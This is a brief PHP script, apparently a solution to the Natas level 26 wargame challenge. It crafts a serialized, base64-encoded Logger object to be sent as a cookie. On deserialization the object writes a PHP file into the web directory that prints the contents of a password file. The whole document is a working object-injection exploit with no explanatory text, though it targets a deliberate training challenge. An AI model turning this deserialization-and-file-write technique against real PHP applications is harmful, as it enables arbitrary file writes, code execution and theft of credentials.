<?php

class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;

        function __construct(){
            $this->initMsg="#--session started--#\n";
	    $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>";
	    $this->logFile = "/var/www/natas/natas26/img/stuffen.php";
	}
}

$breaker = new Logger();
$cooky =  base64_encode(serialize($breaker))."\n";
print $cooky;
print unserialize(base64_decode($cooky));
?>
